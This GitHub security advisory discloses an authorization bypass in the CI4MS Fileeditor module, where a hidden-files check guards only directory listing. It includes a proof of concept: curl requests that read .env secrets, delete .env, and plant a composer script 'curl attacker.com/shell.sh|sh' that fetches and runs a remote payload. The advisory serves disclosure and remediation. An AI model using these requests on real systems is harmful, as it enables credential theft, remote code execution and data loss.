# [M] CI4MS has a Hidden Items Authorization Bypass in Fileeditor Allows Reading Secrets and Writing Protected Files

## Summary
Severity: Medium
Advisory: GHSA-9rxp-f27p-wv3h
CVE: CVE-2026-39389
CWE: CWE-285
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:L (CVSS_V3)
Published: 2026-04-08
Source: https://github.com/advisories/GHSA-9rxp-f27p-wv3h
Type: github-advisory

## Affected
- Packagist: `ci4-cms-erp/ci4ms` — affected >=0 <0.31.4.0

## Details
## Summary

The Fileeditor controller defines a `hiddenItems` array containing security-sensitive paths (`.env`, `composer.json`, `vendor/`, `.git/`) but only enforces this protection in the `listFiles()` method. The `readFile()`, `saveFile()`, `deleteFileOrFolder()`, `renameFile()`, `createFile()`, and `createFolder()` endpoints perform no hidden items validation, allowing direct API access to files that are intended to be protected. A backend user with only `fileeditor.read` permission can exfiltrate application secrets from `.env`, and a user with `fileeditor.update` permission can overwrite `composer.json` to achieve remote code execution.

## Details

The `hiddenItems` array is defined at `modules/Fileeditor/Controllers/Fileeditor.php:10-26`:

```php
protected $hiddenItems = [
    '.git', '.github', '.idea', '.vscode',
    'node_modules', 'vendor', 'writable',
    '.env', 'env', 'composer.json', 'composer.lock',
    'tests', 'spark', 'phpunit.xml.dist', 'preload.php'
];
```

This array is checked **only** in `listFiles()` at lines 45-48 and 64:

```php
// Line 45-48 - path component check
foreach ($pathParts as $part) {
    if (in_array($part, $this->hiddenItems)) {
        return $this->failForbidden();
    }
}
// Line 64 - directory listing filter
if (in_array($name, $this->hiddenItems)) continue;
```

However, `readFile()` (line 76) performs **neither** a `hiddenItems` check **nor** an `allowedFileTypes()` check:

```php
public function readFile()
{
    // ... validation ...
    $path = $this->request->getVar('path');
    $fullPath = realpath(ROOTPATH . $path);
    if (!$fullPath || !is_file($fullPath) || strpos($fullPath, realpath(ROOTPATH)) !== 0) {
        return $this->response->setJSON(['error' => '...'])->setStatusCode(400);
    }
    return $this->response->setJSON(['content' => file_get_contents($fullPath)]);
}
```

This means any file within ROOTPATH — regardless of extension (`.php`, `.env`, etc.) — can be read by any user with the `fileeditor.read` permission.

Similarly, `saveFile()` (line 92) checks `allowedFileTypes()` but not `hiddenItems`. Since `json` is in `$allowedExtensions`, `composer.json` (which is explicitly in `hiddenItems`) can be overwritten:

```php
protected $allowedExtensions = ['css', 'js', 'html', 'txt', 'json', 'sql', 'md'];
```

`deleteFileOrFolder()` (line 194) checks neither `hiddenItems` nor `allowedFileTypes()`.

**Compounding factor:** CSRF protection is disabled for all fileeditor routes in `modules/Fileeditor/Config/FileeditorConfig.php:7-10`:

```php
public $csrfExcept = [
    'backend/fileeditor',
    'backend/fileeditor/*',
];
```

This means the write and delete operations are additionally vulnerable to cross-site request forgery if an authenticated user visits a malicious page.

## PoC

Requires an authenticated backend session with `fileeditor.read` permission granted.

**Step 1: Read .env file to extract secrets**
```bash
curl -s -b 'ci_session=<valid_session_cookie>' \
  'https://target.com/backend/fileeditor/read?path=/.env'
```
Expected response: JSON containing `.env` file contents including database credentials, encryption keys, and other secrets.

**Step 2: Read PHP configuration files**
```bash
curl -s -b 'ci_session=<valid_session_cookie>' \
  'https://target.com/backend/fileeditor/read?path=/app/Config/Database.php'
```
Expected response: Full database configuration PHP source with credentials (note: `readFile()` has no `allowedFileTypes` check, so `.php` files are readable).

**Step 3: Overwrite composer.json for RCE (requires `fileeditor.update` permission)**
```bash
curl -s -b 'ci_session=<valid_session_cookie>' \
  -X POST 'https://target.com/backend/fileeditor/save' \
  -d 'path=/composer.json' \
  -d 'content={"scripts":{"post-install-cmd":"curl attacker.com/shell.sh|sh"}}'
```
The next `composer install` or `composer update` executes the attacker's script.

**Step 4: Delete .env (requires `fileeditor.delete` permission)**
```bash
curl -s -b 'ci_session=<valid_session_cookie>' \
  -X POST 'https://target.com/backend/fileeditor/deleteFileOrFolder' \
  -d 'path=/.env'
```

## Impact

- **Credential disclosure:** Any backend user with `fileeditor.read` permission can read `.env` (database passwords, encryption keys, API secrets, mail credentials) and any PHP configuration file regardless of extension restrictions.
- **Remote code execution:** A user with `fileeditor.update` permission can overwrite `composer.json` with malicious composer scripts that execute on the next `composer install/update`.
- **Denial of service:** A user with `fileeditor.delete` permission can delete `.env` or other critical configuration files, causing application failure.
- **False security boundary:** Administrators who configure `fileeditor.read` as a limited permission for content editors are unknowingly granting access to all application secrets, since the `hiddenItems` protection only affects the UI file tree, not the API.

## Recommended Fix

Apply `hiddenItems` validation to all endpoints that accept a `path` parameter. Extract the check into a reusable method and also add `allowedFileTypes` to `readFile()`:

```php
// Add this method to the Fileeditor controller
private function isHiddenPath(string $path): bool
{
    $pathParts = explode('/', trim($path, '/'));
    foreach ($pathParts as $part) {
        if (in_array($part, $this->hiddenItems)) {
            return true;
        }
    }
    return false;
}

// Then add to readFile(), saveFile(), renameFile(), createFile(), 
// createFolder(), and deleteFileOrFolder():
if ($this->isHiddenPath($path)) {
    return $this->failForbidden();
}

// Additionally, add allowedFileTypes check to readFile():
if (!$this->allowedFileTypes($fullPath)) {
    return $this->failForbidden();
}
```

Also re-enable CSRF protection by removing the CSRF exemption in `FileeditorConfig.php` (lines 7-10) and ensuring the frontend sends CSRF tokens with requests.

## References
- https://github.com/ci4-cms-erp/ci4ms/security/advisories/GHSA-9rxp-f27p-wv3h
- https://nvd.nist.gov/vuln/detail/CVE-2026-39389
- https://github.com/ci4-cms-erp/ci4ms
- https://github.com/ci4-cms-erp/ci4ms/releases/tag/0.31.4.0
